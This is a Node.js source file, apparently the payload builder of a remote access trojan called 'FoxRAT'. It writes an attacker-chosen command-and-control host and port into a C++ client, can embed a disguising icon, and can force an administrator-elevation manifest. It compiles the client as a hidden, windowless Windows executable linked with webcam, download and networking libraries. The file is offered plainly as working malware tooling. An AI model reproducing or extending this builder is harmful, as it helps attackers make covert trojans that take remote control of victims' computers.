// Builder helper - runs separately from the main server
const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

const PORT = 3000;

exports.build = function(options) {
    const { filename, iconB64, admin } = options;
    const host = options.host || '127.0.0.1';
    const port = options.port || PORT;
    const safeName = (filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';
    const outName = safeName + '.exe';
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'foxrat_build_'));
    const srcPath = path.join(__dirname, 'client', 'client.cpp');

    let source = fs.readFileSync(srcPath, 'utf8');
    source = source.replace(/#define SERVER_HOST ".*?"/, `#define SERVER_HOST "${host || '127.0.0.1'}"`);
    source = source.replace(/#define SERVER_PORT \d+/, `#define SERVER_PORT ${Number(port) || 3000}`);
    
    fs.writeFileSync(path.join(tmpDir, 'client.cpp'), source);

    // Handle icon
    if (iconB64 && iconB64.length > 100) {
        const iconBuf = Buffer.from(iconB64, 'base64');
        if (iconBuf.length > 0) {
            fs.writeFileSync(path.join(tmpDir, 'icon.ico'), iconBuf);
            fs.writeFileSync(path.join(tmpDir, 'client.rc'), '1 ICON "icon.ico"');
        }
    }

    const hasRC = fs.existsSync(path.join(tmpDir, 'client.rc'));
    const rcCmd = hasRC ? 'rc.exe /nologo client.rc && ' : '';
    const resObj = hasRC ? 'client.res ' : '';

    // Use vswhere to detect VS
    const vswherePaths = [
        process.env['ProgramFiles(x86)'] + '\\Microsoft Visual Studio\\Installer\\vswhere.exe',
        process.env.ProgramFiles + '\\Microsoft Visual Studio\\Installer\\vswhere.exe'
    ];
    let vsPath = null;
    for (const vp of vswherePaths) {
        if (fs.existsSync(vp)) {
            try {
                const result = execSync('"' + vp + '" -latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath', { encoding: 'utf8', timeout: 10000 }).trim();
                if (result) vsPath = result;
            } catch(_) {}
        }
    }
    if (!vsPath) {
        fs.rmSync(tmpDir, { recursive: true, force: true });
        throw new Error('VS not found');
    }

    const manifestFlag = admin ? ' /MANIFESTUAC:"level=\'requireAdministrator\' uiAccess=\'false\'"' : '';
    // Write a batch file in temp dir
    const batchContent = `@echo off
call "${vsPath}\\VC\\Auxiliary\\Build\\vcvarsall.bat" x64
if errorlevel 1 exit /b 1
${rcCmd}cl.exe /nologo /O2 /MT /GL /EHa /W3 /std:c++17 /D_SILENCE_ALL_CXX17_DEPRECATION_WARNINGS ${resObj}client.cpp /Fe"${outName}" /link /SUBSYSTEM:WINDOWS /LTCG${manifestFlag} user32.lib gdi32.lib ws2_32.lib winmm.lib urlmon.lib advapi32.lib ole32.lib oleaut32.lib gdiplus.lib iphlpapi.lib winhttp.lib shell32.lib vfw32.lib
if errorlevel 1 exit /b 1
`;
    fs.writeFileSync(path.join(tmpDir, 'build.bat'), batchContent);
    
    try {
        execSync('build.bat', { cwd: tmpDir, timeout: 180000, stdio: 'pipe' });
    } catch(e) {
        const stdout = e.stdout ? e.stdout.toString() : '';
        const stderr = e.stderr ? e.stderr.toString() : '';
        fs.rmSync(tmpDir, { recursive: true, force: true });
        throw new Error('Build failed: ' + (stderr || stdout || e.message));
    }

    const exePath = path.join(tmpDir, outName);
    if (!fs.existsSync(exePath)) {
        fs.rmSync(tmpDir, { recursive: true, force: true });
        throw new Error('Build failed - no output');
    }

    const exeData = fs.readFileSync(exePath);
    fs.rmSync(tmpDir, { recursive: true, force: true });
    return exeData;
};
